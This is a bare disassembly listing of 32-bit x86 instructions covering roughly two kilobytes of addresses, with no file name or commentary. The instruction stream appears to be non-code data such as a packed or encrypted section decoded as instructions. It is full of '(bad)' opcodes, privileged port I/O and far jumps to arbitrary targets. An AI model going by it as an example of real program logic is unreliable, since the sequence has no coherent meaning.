  415746:	xchg   ebp,eax
  415747:	lds    edi,FWORD PTR [eax]
  415749:	adc    BYTE PTR [ecx+edi*8-0x84d0831],dh
  415750:	xchg   esi,eax
  415751:	jge    0x4156f2
  415753:	lock daa 
  415755:	in     al,dx
  415756:	arpl   WORD PTR [eax-0x64],dx
  415759:	loop   0x4156e7
  41575b:	push   edx
  41575c:	mov    ah,0xc5
  41575e:	add    BYTE PTR [edi],ah
  415760:	pop    ss
  415761:	adc    al,0x71
  415763:	adc    dh,BYTE PTR [ebp+0x47ea0d4]
  415769:	sub    eax,0x56ac73da
  41576f:	adc    edx,DWORD PTR [edx]
  415771:	pop    ebx
  415772:	mov    dl,0x35
  415774:	int3   
  415775:	js     0x415795
  415777:	dec    ebp
  415778:	and    al,0xf9
  41577a:	ds push ecx
  41577c:	das    
  41577d:	das    
  41577e:	(bad)  
  41577f:	pusha  
  415780:	repnz daa 
  415782:	add    dl,BYTE PTR [edx+0x581c4693]
  415788:	xchg   ecx,eax
  415789:	jle    0x41572b
  41578b:	inc    edx
  41578c:	sti    
  41578d:	repnz ror DWORD PTR [ebp-0x38bf5ab3],0x30
  415795:	mov    ch,0x7c
  415797:	lea    ebx,[eax+0x3b02f145]
  41579d:	adc    cl,BYTE PTR [edx+0x72]
  4157a0:	in     al,0x3e
  4157a2:	fidiv  DWORD PTR [edi]
  4157a4:	push   ds
  4157a5:	add    eax,0x902e7365
  4157aa:	cmp    al,0xf
  4157ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157ad:	adc    DWORD PTR [edx-0x4cd5250e],esp
  4157b3:	mov    al,0x24
  4157b5:	inc    edi
  4157b6:	(bad)  
  4157b7:	pop    esp
  4157b8:	call   0xf2c9:0xb0f95b75
  4157bf:	add    DWORD PTR [ebx],0xab9d22b5
  4157c5:	push   0xffffffbc
  4157c7:	in     eax,0x67
  4157c9:	add    dh,0xca
  4157cc:	and    eax,0x799d0b72
  4157d1:	in     eax,0x59
  4157d3:	shr    DWORD PTR es:[ebx+0x94dd27c],cl
  4157da:	xchg   edx,eax
  4157db:	or     BYTE PTR [ebx],0x36
  4157de:	inc    esi
  4157df:	out    dx,al
  4157e0:	aad    0xbb
  4157e2:	repz push ds
  4157e4:	out    dx,eax
  4157e5:	push   ebx
  4157e6:	nop
  4157e7:	ficom  DWORD PTR [eax+esi*4]
  4157ea:	dec    edi
  4157eb:	fmul   st(3),st
  4157ed:	int    0x18
  4157ef:	pop    ecx
  4157f0:	inc    esi
  4157f1:	scas   eax,DWORD PTR es:[edi]
  4157f2:	test   BYTE PTR [ebx-0x5f],0xec
  4157f6:	adc    BYTE PTR [esi+eax*4],bh
  4157f9:	sub    ebx,0x72
  4157fc:	jecxz  0x415808
  4157fe:	loope  0x41582c
  415800:	in     al,0xa1
  415802:	rol    BYTE PTR [edi-0x7ad75c40],1
  415808:	push   ss
  415809:	mov    edx,?
  41580b:	xchg   esp,eax
  41580c:	ds pop eax
  41580e:	dec    ecx
  41580f:	aad    0xb7
  415811:	loope  0x4157f0
  415813:	jle    0x415837
  415815:	loopne 0x4157d4
  415817:	xor    edx,ebx
  415819:	pusha  
  41581a:	inc    esi
  41581b:	add    ebp,esi
  41581d:	mov    esi,0x772b42fb
  415822:	mov    ch,0x3e
  415824:	mov    ecx,0x9011b89e
  415829:	or     DWORD PTR ds:0xb448b94f,ebx
  41582f:	xor    al,0x74
  415831:	dec    eax
  415832:	dec    esp
  415833:	mov    al,ds:0x7a00c2ba
  415838:	imul   ecx,DWORD PTR [ebx-0x737be301],0xffffffaf
  41583f:	or     BYTE PTR [ecx-0x70],cl
  415842:	fs cld 
  415844:	xchg   ecx,eax
  415845:	xor    eax,0x679496dd
  41584a:	sub    edx,DWORD PTR [ebp+0x19f9cb01]
  415850:	ja     0x415857
  415852:	inc    edx
  415853:	cmp    al,0x49
  415855:	or     edi,eax
  415857:	scas   al,BYTE PTR es:[edi]
  415858:	sbb    DWORD PTR [esi],edi
  41585a:	out    0xa7,al
  41585c:	jb     0x415842
  41585e:	das    
  41585f:	mov    dl,0xdf
  415861:	add    ebp,eax
  415863:	arpl   si,di
  415865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415866:	mov    esp,0xe3ff745d
  41586b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41586c:	sbb    BYTE PTR [edx+0x41],0x8
  415870:	adc    al,cl
  415872:	xchg   BYTE PTR [esi],bl
  415874:	mov    esp,0xf10c7df1
  415879:	push   ecx
  41587a:	push   0x2e
  41587c:	shl    BYTE PTR [edi+0xb59a22e],1
  415882:	bound  eax,QWORD PTR [eax]
  415884:	adc    bl,cl
  415886:	aas    
  415887:	data16 adc bl,BYTE PTR [edx]
  41588a:	ss in  eax,0xfa
  41588d:	xchg   ebx,eax
  41588e:	les    edx,FWORD PTR [eax+0x53341f54]
  415894:	dec    eax
  415895:	and    eax,0x2432ccae
  41589a:	dec    esi
  41589b:	dec    ecx
  41589c:	push   ebx
  41589d:	in     al,dx
  41589e:	sub    al,dh
  4158a0:	and    ebp,DWORD PTR [ecx-0x67]
  4158a3:	dec    edx
  4158a4:	outs   dx,BYTE PTR ds:[esi]
  4158a5:	cmc    
  4158a6:	out    dx,eax
  4158a7:	mov    ss,WORD PTR [edx]
  4158a9:	xchg   DWORD PTR [ecx+0x7e],ebp
  4158ac:	loop   0x415916
  4158ae:	xor    dh,BYTE PTR [edi-0x7d]
  4158b1:	fild   QWORD PTR [esi-0x56]
  4158b4:	and    ebx,DWORD PTR [edi+0x3a46b33a]
  4158ba:	aad    0x87
  4158bc:	sub    eax,0xe94fecef
  4158c1:	dec    ebx
  4158c2:	icebp  
  4158c3:	cmp    eax,edi
  4158c5:	xchg   ecx,eax
  4158c6:	cmp    eax,0xaba7df3f
  4158cb:	xchg   edi,eax
  4158cc:	loop   0x41587a
  4158ce:	out    0x6b,al
  4158d0:	and    bh,BYTE PTR [esi+0x73]
  4158d3:	mov    bl,0x8a
  4158d5:	jae    0x415915
  4158d7:	aam    0x2e
  4158d9:	xor    al,0xf0
  4158db:	pop    ds
  4158dc:	lods   al,BYTE PTR ds:[esi]
  4158dd:	xchg   edi,eax
  4158de:	push   fs
  4158e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158e1:	mov    ecx,0x2724dfca
  4158e6:	jp     0x4158f7
  4158e8:	aaa    
  4158e9:	rcl    DWORD PTR [esp+ebp*8+0x2c],cl
  4158ed:	jo     0x415926
  4158ef:	cli    
  4158f0:	mov    WORD PTR [ebx-0x34],es
  4158f3:	mov    ?,WORD PTR [ebx]
  4158f5:	sbb    DWORD PTR [ecx],0x1
  4158f8:	cmp    DWORD PTR [edi+0x4a1a3be3],eax
  4158fe:	int3   
  4158ff:	stos   BYTE PTR es:[edi],al
  415900:	inc    ecx
  415901:	adc    al,0xef
  415903:	jo     0x41589d
  415905:	jmp    0x4158a8
  415907:	pop    ebp
  415908:	stos   BYTE PTR es:[edi],al
  415909:	lods   al,BYTE PTR ds:[esi]
  41590a:	add    ah,BYTE PTR ds:0x44e3e534
  415910:	pushf  
  415911:	sub    BYTE PTR [ebx+0x52e8d6d8],dh
  415917:	mov    dh,0x29
  415919:	loope  0x415960
  41591b:	loope  0x41598b
  41591d:	sub    ebx,DWORD PTR ds:0x9dd9da1f
  415923:	mov    DWORD PTR ds:0xd4a00cf0,edx
  415929:	aad    0xc6
  41592b:	ret    
  41592c:	mov    WORD PTR [eax+esi*4-0x418e3a18],fs
  415933:	sbb    bh,BYTE PTR [ebp+0x12]
  415936:	loop   0x4158e4
  415938:	out    0x59,eax
  41593a:	inc    esi
  41593c:	jle    0x4158ec
  41593e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41593f:	ficom  WORD PTR [edx]
  415941:	mov    bl,0xed
  415943:	out    dx,eax
  415944:	mov    ebx,0xbab2acab
  415949:	out    dx,eax
  41594a:	ins    BYTE PTR es:[edi],dx
  41594b:	add    eax,0xf3746572
  415950:	gs pop es
  415952:	mov    eax,es:0x8ce9a2e2
  415958:	xchg   ebp,eax
  415959:	fisubr DWORD PTR [ebp+0x9]
  41595c:	call   0xb82816a8
  415961:	xchg   ebp,eax
  415962:	fcmovbe st,st(3)
  415964:	jae    0x415905
  415966:	jae    0x415918
  415968:	in     eax,dx
  415969:	sub    BYTE PTR [esi-0x193b4011],ah
  41596f:	cmp    al,BYTE PTR [ecx-0x75f50974]
  415975:	test   eax,0x86f3b3e
  41597a:	in     eax,dx
  41597b:	outs   dx,DWORD PTR ds:[esi]
  41597c:	push   0xffffff91
  41597e:	jecxz  0x415976
  415980:	jno    0x415912
  415982:	cmp    al,0xe0
  415984:	push   ss
  415985:	outs   dx,BYTE PTR ds:[esi]
  415986:	dec    eax
  415987:	xchg   DWORD PTR [edi],edi
  415989:	push   eax
  41598a:	enter  0xa1d2,0x2f
  41598e:	das    
  41598f:	adc    al,0x83
  415991:	jne    0x41599a
  415993:	pushf  
  415994:	int    0xc4
  415996:	jae    0x415946
  415998:	jne    0x4159e1
  41599a:	shl    al,cl
  41599c:	xor    DWORD PTR [ebx],ebx
  41599e:	mov    al,ds:0xdf86f72f
  4159a3:	aad    0x5a
  4159a5:	jge    0x415945
  4159a7:	into   
  4159a8:	fidivr WORD PTR [eax+0x636ce08e]
  4159ae:	push   cs
  4159af:	jmp    0x415a1c
  4159b1:	int    0xe
  4159b3:	mov    edx,0x4e85d162
  4159b8:	nop
  4159b9:	loop   0x4159ea
  4159bb:	mov    ch,0x4a
  4159bd:	ret    0x9ac1
  4159c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159c1:	adc    edi,edx
  4159c3:	pop    ss
  4159c4:	xor    dl,BYTE PTR [ebp+0x17]
  4159c7:	popf   
  4159c8:	(bad)
  4159cd:	xor    eax,0x3cc2e2aa
  4159d2:	les    esp,FWORD PTR [ebx+ebp*2]
  4159d5:	dec    eax
  4159d6:	pop    ebp
  4159d7:	imul   esi,DWORD PTR [esi],0xffffff9c
  4159da:	outs   dx,DWORD PTR ds:[esi]
  4159db:	push   ds
  4159dc:	iret   
  4159dd:	or     eax,0xb04e97cb
  4159e2:	jo     0x415984
  4159e4:	(bad)  [ebx+0x71b6f272]
  4159ea:	aas    
  4159eb:	pop    eax
  4159ec:	div    DWORD PTR [ebp+0x43]
  4159ef:	pop    ecx
  4159f0:	bound  edx,QWORD PTR [ebx+0x51]
  4159f3:	add    ecx,edx
  4159f5:	retf   
  4159f6:	shl    DWORD PTR [esi+0x74],cl
  4159f9:	in     eax,0xfd
  4159fb:	in     al,0xd6
  4159fd:	jmp    0x415a11
  4159ff:	daa    
  415a00:	jnp    0x415a1b
  415a02:	sub    DWORD PTR [eax-0x5ebb14e7],edi
  415a08:	xor    cl,BYTE PTR [esi]
  415a0a:	loop   0x4159e1
  415a0c:	jno    0x4159ef
  415a0e:	lds    eax,FWORD PTR [ecx-0x55]
  415a11:	jb     0x415a54
  415a13:	sbb    BYTE PTR [ebx],dl
  415a15:	jo     0x4159e4
  415a17:	pop    es
  415a18:	pop    ds
  415a19:	lods   al,BYTE PTR ds:[esi]
  415a1a:	push   edi
  415a1b:	mov    edx,0x5dec9fe7
  415a20:	dec    edi
  415a21:	push   0x7d
  415a23:	cwde   
  415a24:	(bad)  
  415a25:	sub    al,0x9a
  415a27:	in     al,0x6c
  415a29:	pop    esi
  415a2a:	xchg   edi,eax
  415a2b:	fdivp  st(6),st
  415a2d:	or     BYTE PTR [eax-0x143d471f],ch
  415a33:	aad    0xca
  415a35:	pop    edx
  415a36:	sbb    cl,dl
  415a38:	in     al,dx
  415a39:	and    eax,0x8169025a
  415a3e:	sub    esi,DWORD PTR [ebx]
  415a40:	push   esi
  415a41:	mov    edi,0x28a243c1
  415a46:	cwde   
  415a47:	push   ss
  415a48:	push   ecx
  415a49:	sub    DWORD PTR [esi+ebp*8-0x4f54405e],ebx
  415a50:	dec    ecx
  415a51:	out    0xf1,eax
  415a53:	inc    edi
  415a54:	dec    esp
  415a55:	outs   dx,DWORD PTR ds:[esi]
  415a56:	les    edi,FWORD PTR [ebp+0x2b7f6071]
  415a5c:	add    BYTE PTR ds:0xc055e377,dl
  415a62:	cmp    BYTE PTR [edx-0x5cb61168],dl
  415a68:	rcl    BYTE PTR [edi+edi*4],cl
  415a6b:	popf   
  415a6c:	xchg   ebp,eax
  415a6d:	std    
  415a6e:	out    0x88,eax
  415a70:	sub    edx,DWORD PTR ds:0x4618d29d
  415a76:	fs call 0xbf7c:0x58af200c
  415a7e:	aad    0xe7
  415a80:	mov    edx,0x64dd8a94
  415a85:	dec    edx
  415a86:	inc    edi
  415a87:	mov    esi,0xe2df17bc
  415a8c:	(bad)  
  415a8d:	sbb    cl,al
  415a8f:	sbb    ebp,0x6c
  415a92:	jne    0x415afb
  415a94:	int3   
  415a95:	popa   
  415a96:	jp     0x415ac2
  415a98:	call   0x335f:0x832f30ec
  415a9f:	lock jmp 0xb98d:0xc1b0791f
  415aa7:	push   ss
  415aa8:	xchg   ecx,eax
  415aa9:	(bad)  
  415aaa:	mov    WORD PTR [eax],?
  415aac:	loop   0x415ae7
  415aae:	lea    esp,[edx]
  415ab0:	(bad)  
  415ab1:	dec    ebx
  415ab2:	sbb    esp,esi
  415ab4:	dec    ebx
  415ab5:	int    0x5a
  415ab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ab8:	jmp    0x72c471e2
  415abd:	popa   
  415abe:	outs   dx,DWORD PTR ds:[esi]
  415abf:	and    al,0xcc
  415ac1:	jns    0x415afb
  415ac3:	xor    eax,0xdb15ab20
  415ac8:	int3   
  415ac9:	pop    eax
  415aca:	(bad)  
  415acb:	adc    cl,bh
  415acd:	leave  
  415ace:	inc    ebp
  415acf:	lea    ebx,[edi+eax*1+0x1a03498b]
  415ad6:	call   0x3a19:0xc0148c97
  415add:	sub    eax,0xd8e72fbd
  415ae2:	stc    
  415ae3:	mov    eax,0x7f9ba382
  415ae8:	in     eax,dx
  415ae9:	mov    eax,ds:0x1be3b977
  415aee:	add    eax,0x86716cee
  415af3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415af4:	adc    eax,0x1f37300c
  415af9:	jnp    0x415b25
  415afb:	sar    ch,cl
  415afd:	test   DWORD PTR [ebx-0x10],ecx
  415b00:	cs in  al,0xd3
  415b03:	scas   al,BYTE PTR es:[edi]
  415b04:	xor    dh,bh
  415b06:	push   0x51
  415b08:	push   ds
  415b09:	lea    ebp,[ebp+0x2f]
  415b0c:	retf   
  415b0d:	mov    fs,WORD PTR [eax-0x1747b0b]
  415b13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b14:	leave  
  415b15:	sub    eax,0xcda97efe
  415b1a:	sti    
  415b1b:	inc    ebx
  415b1c:	dec    ebx
  415b1d:	cli    
  415b1e:	push   eax
  415b1f:	loopne 0x415aed
  415b21:	and    DWORD PTR [edx+0x8a98c22],esi
  415b27:	pop    es
  415b28:	test   BYTE PTR [edx],0x3e
  415b2b:	shr    BYTE PTR [edi+0x33],0x83
  415b2f:	fcom   QWORD PTR [ecx]
  415b31:	pop    ds
  415b32:	or     eax,0x71832cc5
  415b37:	ret    
  415b38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b39:	inc    esi
  415b3a:	in     eax,0x98
  415b3c:	cli    
  415b3d:	mov    bh,0x25
  415b3f:	mov    ds:0x182454a6,al
  415b44:	lea    ebx,[edi+eiz*4-0x7a25d555]
  415b4b:	pushf  
  415b4c:	(bad)  
  415b4d:	fisttp QWORD PTR [esp+edi*8-0x1c]
  415b51:	(bad)  
  415b52:	ins    DWORD PTR es:[edi],dx
  415b53:	(bad)  
  415b54:	adc    edi,DWORD PTR [esi-0x14]
  415b57:	sub    al,0xf8
  415b59:	sbb    BYTE PTR [ecx],ah
  415b5b:	lock inc ebx
  415b5d:	jg     0x415af8
  415b5f:	inc    ebx
  415b60:	adc    BYTE PTR [ecx-0x71],cl
  415b63:	and    al,BYTE PTR [ebp+0x3e]
  415b66:	clc    
  415b67:	push   es
  415b68:	cmp    BYTE PTR [ecx],0x8
  415b6b:	ror    bh,0x45
  415b6e:	xchg   esp,eax
  415b70:	dec    ebp
  415b71:	mov    ?,WORD PTR [ecx+edx*4]
  415b74:	adc    eax,0x1e6df496
  415b79:	scas   al,BYTE PTR es:[edi]
  415b7a:	(bad)  
  415b7b:	lods   eax,DWORD PTR ds:[esi]
  415b7c:	mov    ecx,0xd7cca975
  415b81:	xor    bh,BYTE PTR [ebp-0x2ae29f4]
  415b87:	jmp    0x415bf6
  415b89:	or     DWORD PTR [ebx-0x214ec58d],ecx
  415b8f:	push   edi
  415b90:	mov    ch,0xde
  415b92:	jp     0x415b40
  415b94:	(bad)  
  415b95:	mov    edi,0xf1fd4ad6
  415b9a:	mov    dh,0xec
  415b9c:	lods   eax,DWORD PTR ds:[esi]
  415b9d:	mov    gs,WORD PTR [edx-0xf3d5b8d]
  415ba3:	fisttp QWORD PTR [ecx-0x1f5f160d]
  415ba9:	in     eax,dx
  415baa:	sub    al,0x31
  415bac:	or     eax,0xf5b8f252
  415bb1:	mul    DWORD PTR [eax-0x5eb8acae]
  415bb7:	(bad)
  415bba:	mov    ecx,0x9f1d0f16
  415bbf:	jmp    DWORD PTR [eax]
  415bc1:	pop    esp
  415bc2:	fsub   DWORD PTR [eax+edi*4-0x12e53bad]
  415bc9:	sbb    edi,eax
  415bcb:	aas    
  415bcc:	lods   al,BYTE PTR ds:[esi]
  415bcd:	mov    bl,0x61
  415bcf:	out    0x2c,eax
  415bd1:	imul   edx,DWORD PTR [ebx+edi*4+0x27],0xb06b6271
  415bd9:	stc    
  415bda:	xlat   BYTE PTR ds:[ebx]
  415bdb:	hlt    
  415bdc:	out    dx,al
  415bdd:	cmp    al,0xe3
  415bdf:	inc    eax
  415be0:	outs   dx,DWORD PTR ds:[esi]
  415be1:	dec    eax
  415be2:	iret   
  415be3:	mov    ebp,ebp
  415be5:	dec    esi
  415be6:	xchg   BYTE PTR [ebx-0x33732652],ch
  415bec:	into   
  415bed:	not    DWORD PTR [edi-0x6909ad66]
  415bf3:	neg    BYTE PTR [edx]
  415bf5:	xor    al,al
  415bf7:	in     al,dx
  415bf8:	imul   ecx,DWORD PTR [eax-0x5f],0x675cf831
  415bff:	inc    ebx
  415c00:	shr    DWORD PTR [esi-0x75],1
  415c03:	enter  0xd05f,0xb2
  415c07:	call   0x1ef32635
  415c0c:	push   ds
  415c0d:	xor    ah,BYTE PTR [esi-0x58]
  415c10:	xor    DWORD PTR [edi+eiz*1-0x700b9bef],edi
  415c17:	imul   edx,DWORD PTR [esi+0x6fc10d69],0x7605145d
  415c21:	mov    ebp,0x620895f4
  415c26:	in     eax,0xba
  415c28:	dec    esp
  415c29:	or     BYTE PTR [edi+0x1e256de6],0x16
  415c30:	arpl   WORD PTR [ebp-0x4882a0be],dx
  415c36:	cmp    al,bl
  415c38:	imul   esi,DWORD PTR [eax],0xd8b700af
  415c3e:	out    0x43,eax
  415c40:	pop    ecx
  415c41:	and    ch,ah
  415c43:	sbb    eax,0xcdf4834a
  415c48:	jo     0x415cc7
  415c4a:	mov    eax,ds:0xbb442678
  415c4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c50:	inc    ebp
  415c51:	jne    0x415c8f
  415c53:	leave  
  415c54:	mov    dh,dl
  415c56:	nop
  415c57:	loope  0x415c79
  415c59:	pop    eax
  415c5a:	cmp    BYTE PTR [eax-0x1d],al
  415c5d:	sub    BYTE PTR [ebx+0x42d0da9f],0x4a
  415c64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c65:	inc    ecx
  415c66:	mov    ah,BYTE PTR [ebp-0x73]
  415c69:	jge    0x415ccd
  415c6b:	loop   0x415c07
  415c6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c6e:	mov    bl,0x19
  415c70:	mov    ah,0x12
  415c72:	inc    eax
  415c73:	scas   eax,DWORD PTR es:[edi]
  415c74:	in     al,dx
  415c75:	retf   
  415c76:	xchg   ebx,eax
  415c77:	xor    ebp,DWORD PTR [esi-0x68]
  415c7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c7b:	xchg   esp,eax
  415c7c:	dec    edx
  415c7d:	inc    edi
  415c7e:	fist   WORD PTR [ecx]
  415c80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c81:	mov    esi,0x9e8a0ef6
  415c86:	push   cs
  415c87:	pop    edi
  415c88:	xlat   BYTE PTR ds:[ebx]
  415c89:	(bad)  
  415c8a:	xor    ch,al
  415c8c:	sub    al,0x21
  415c8e:	into   
  415c8f:	iret   
  415c90:	dec    eax
  415c91:	ror    bh,cl
  415c93:	int3   
  415c94:	pop    ebp
  415c95:	cmp    BYTE PTR [ecx-0x2],0x33
  415c99:	cwde   
  415c9a:	int3   
  415c9b:	ja     0x415c30
  415c9d:	add    DWORD PTR [edi+edx*2],ebx
  415ca0:	lds    edi,FWORD PTR [esi+edx*4]
  415ca3:	adc    ebx,DWORD PTR [ebx-0x5a8fa891]
  415ca9:	cmp    ecx,DWORD PTR [ecx+0x9]
  415cac:	ds adc eax,0x21999a79
  415cb2:	push   es
  415cb3:	es push ebx
  415cb5:	pusha  
  415cb6:	sbb    BYTE PTR [eax+edi*8-0xf],ch
  415cba:	scas   al,BYTE PTR es:[edi]
  415cbb:	(bad)  
  415cbc:	or     ebp,edx
  415cbe:	dec    eax
  415cbf:	mov    bh,0x69
  415cc1:	mov    ds:0x6b32505e,al
  415cc6:	push   edi
  415cc7:	push   esi
  415cc8:	mov    edi,0xe4ec0636
  415ccd:	xor    eax,0xeac1b9ff
  415cd2:	outs   dx,BYTE PTR ds:[esi]
  415cd3:	jg     0x415c5e
  415cd5:	fucom  st(6)
  415cd7:	mov    edx,0x6909c48b
  415cdc:	mov    ds:0x49063cbc,al
  415ce1:	mov    ah,dl
  415ce3:	rcr    ecx,0xdb
  415ce6:	in     eax,dx
  415ce7:	push   esi
  415ce8:	out    dx,al
  415ce9:	pop    esi
  415cea:	sub    eax,0x28c08590
  415cef:	dec    esp
  415cf0:	or     BYTE PTR [eax+eax*4],0xbf
  415cf4:	mov    dl,0x7
  415cf6:	(bad)  
  415cf7:	adc    ah,ah
  415cf9:	xor    al,0xef
  415cfb:	dec    eax
  415cfc:	sahf   
  415cfd:	pop    eax
  415cfe:	mov    ds:0xc66e89c2,eax
  415d03:	jmp    FWORD PTR [edx+0x32]
  415d06:	cdq    
  415d07:	push   ecx
  415d08:	stc    
  415d09:	cli    
  415d0a:	ret    0x1860
  415d0d:	jp     0x415d40
  415d0f:	cmp    BYTE PTR [eax+0x4fda4d53],bh
  415d15:	mov    ah,0x9e
  415d17:	stos   DWORD PTR es:[edi],eax
  415d18:	mov    eax,edi
  415d1a:	nop
  415d1b:	in     eax,dx
  415d1c:	push   cs
  415d1d:	leave  
  415d1e:	adc    eax,0x40e9c39b
  415d23:	in     al,dx
  415d24:	in     eax,dx
  415d25:	pop    edi
  415d26:	mov    dh,0xe
  415d28:	dec    edx
  415d29:	fldenv [eax+0x46]
  415d2c:	add    bh,ah
  415d2e:	sub    cl,BYTE PTR [edi-0x45]
  415d31:	mov    al,ds:0x71437023
  415d36:	(bad)  
  415d37:	shr    BYTE PTR [edi-0x1b8be4d4],1
  415d3d:	(bad)  
  415d3e:	xchg   ecx,eax
  415d3f:	xor    dh,BYTE PTR [edx+ebp*1+0x2d]
  415d43:	retf   0x134e
  415d46:	rol    eax,1
  415d48:	xor    eax,0xf15b8a70
  415d4d:	mov    al,ds:0xc6f7e432
  415d52:	inc    esp
  415d53:	pop    edx
  415d54:	mov    bl,0xf8
  415d56:	pop    edi
  415d57:	(bad)  
  415d58:	fst    DWORD PTR [eax-0x5c]
  415d5b:	(bad)  
  415d5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d5d:	enter  0x4796,0xe0
  415d61:	int3   
  415d62:	adc    eax,0x2cba2adb
  415d67:	jl     0x415d30
  415d69:	adc    eax,0xad8a93a7
  415d6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d6f:	sbb    al,0xaa
  415d71:	shr    BYTE PTR [esi],0xbd
  415d74:	pop    ebx
  415d75:	or     DWORD PTR [eax-0x5c1ab5bc],eax
  415d7b:	cld    
  415d7c:	jmp    0x415d7d
  415d7e:	pop    ds
  415d7f:	lods   eax,DWORD PTR ds:[esi]
  415d80:	and    eax,0x1fcbabe3
  415d85:	mov    dl,0x92
  415d87:	pushf  
  415d88:	fistp  WORD PTR [ebx+ebp*8-0x7c5acbf6]
  415d8f:	shr    BYTE PTR [ebx],cl
  415d91:	dec    ebp
  415d92:	sbb    edi,DWORD PTR [ebx+esi*4+0x19e1c59b]
  415d99:	jnp    0x415da4
  415d9b:	inc    eax
  415d9c:	in     al,dx
  415d9d:	xchg   esp,eax
  415d9e:	dec    ebx
  415d9f:	sti    
  415da0:	or     al,bl
  415da2:	jno    0x415d7f
  415da4:	das    
  415da5:	and    eax,ebp
  415da7:	scas   al,BYTE PTR es:[edi]
  415da8:	jns    0x415d5c
  415daa:	sub    bh,bl
  415dac:	repnz loope 0x415e21
  415daf:	in     al,0xa2
  415db1:	rcr    edx,0x64
  415db4:	pop    esi
  415db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415db6:	and    al,0xa6
  415db8:	js     0x415d58
  415dba:	mov    eax,DWORD PTR [ebx+0x3e]
  415dbd:	and    eax,0xd5339d35
  415dc2:	out    0x90,al
  415dc4:	and    eax,esp
  415dc6:	rcl    BYTE PTR [eax+0x73056e97],cl
  415dcc:	aam    0xae
  415dce:	fs ja  0x415e02
  415dd1:	nop
  415dd2:	mov    esp,0x65be89c1
  415dd7:	repnz add ebx,edx
  415dda:	add    BYTE PTR [ecx-0x65fb6e7c],ch
  415de0:	rol    esi,0x2c
  415de3:	push   ebp
  415de4:	dec    esi
  415de5:	mov    cl,0x1b
  415de7:	xchg   edx,eax
  415de8:	stc    
  415de9:	mov    ah,0x3c
  415deb:	or     al,0x31
  415ded:	popf   
  415dee:	pop    ss
  415def:	or     ch,BYTE PTR [edx-0x36f7a4e0]
  415df5:	sbb    al,0x15
  415df7:	pusha  
  415df8:	out    dx,al
  415df9:	test   eax,0xb40fbf65
  415dfe:	inc    eax
  415dff:	out    dx,al
  415e00:	add    al,0xbc
  415e02:	icebp  
  415e03:	cmp    dh,dl
  415e05:	jp     0x415de6
  415e07:	dec    ebx
  415e08:	scas   eax,DWORD PTR es:[edi]
  415e09:	arpl   WORD PTR [eax+edx*4],bx
  415e0c:	dec    eax
  415e0d:	add    DWORD PTR [ebp+0x23dce19d],edi
  415e13:	dec    ebp
  415e14:	aad    0xd7
  415e16:	mov    bx,0xe6ad
  415e1a:	adc    eax,0x7e59aded
  415e1f:	pop    ss
  415e20:	shl    BYTE PTR ds:0x6a16b15d,0x91
  415e27:	inc    ecx
  415e28:	mov    edi,0x946bfbbc
  415e2d:	je     0x415def
  415e2f:	iret   
  415e30:	mov    gs,WORD PTR [edi-0x62051ead]
  415e36:	sub    DWORD PTR [ebx],edi
  415e38:	pop    eax
  415e39:	adc    eax,0x99b88341
  415e3e:	mov    dl,0x9
  415e40:	fst    DWORD PTR [edx]
  415e42:	pop    edx
  415e43:	jnp    0x415e14
  415e45:	xor    DWORD PTR [eax+0x45],edx
  415e48:	dec    esp
  415e49:	add    BYTE PTR [ebx-0x61],bl
  415e4c:	add    esi,edi
  415e4e:	dec    edi
  415e4f:	and    eax,0x94205178
  415e54:	jmp    0x7f2:0x5f1f4585
  415e5b:	pop    es
  415e5c:	cmp    DWORD PTR [edi-0x5e786984],ebx
  415e62:	adc    BYTE PTR [edx+ebp*1],0xf5
  415e66:	mov    bl,dh
  415e68:	jns    0x415e20
  415e6a:	mov    al,ds:0xcdd5cacb
  415e6f:	push   ds
  415e70:	into   
  415e71:	cmp    eax,0xfb402987
  415e76:	fnstsw WORD PTR [edi+eax*2-0x47a1439e]
  415e7d:	mov    al,BYTE PTR [ebp-0x1b]
  415e80:	(bad)  
  415e81:	mov    bl,0x25
  415e83:	push   ecx
  415e84:	popf   
  415e85:	pop    esi
  415e86:	clc    
  415e87:	out    dx,al
  415e88:	add    eax,0x4976dc4b
  415e8d:	in     al,0xfe
  415e8f:	sbb    eax,0xc5f8a365
  415e94:	cmp    edi,esp
  415e96:	push   ebp
  415e97:	cwde   
  415e98:	mov    DWORD PTR [ebx+0x69103545],eax
  415e9e:	leave  
  415e9f:	sbb    bh,ch
  415ea1:	jns    0x415e59
  415ea3:	pushf  
  415ea4:	push   edx
  415ea5:	rol    DWORD PTR [edi-0x32],0x77
  415ea9:	xchg   BYTE PTR [ecx-0x5eaa13aa],ah
  415eaf:	mov    al,0x9
  415eb1:	adc    esi,eax
  415eb3:	pushf  
  415eb4:	and    eax,0x828a5975
  415eb9:	arpl   di,bp
  415ebb:	xor    al,0x4a
  415ebd:	dec    esp
  415ebe:	jg     0x415f05
  415ec0:	dec    esi
  415ec1:	jb     0x415ea6
  415ec3:	inc    esi
  415ec4:	lods   eax,DWORD PTR ds:[esi]
  415ec5:	cs hlt 
  415ec7:	jbe    0x415ef4
  415ec9:	test   DWORD PTR [eax-0x760109aa],edx
  415ecf:	leave  
  415ed0:	pop    ss
  415ed1:	jg     0x415e60
  415ed3:	loope  0x415ee5
  415ed5:	aas    
  415ed6:	mov    al,ds:0xfd4fe609
  415edb:	lahf   
  415edc:	es stos BYTE PTR es:[edi],al
  415ede:	dec    ecx
  415edf:	dec    esi
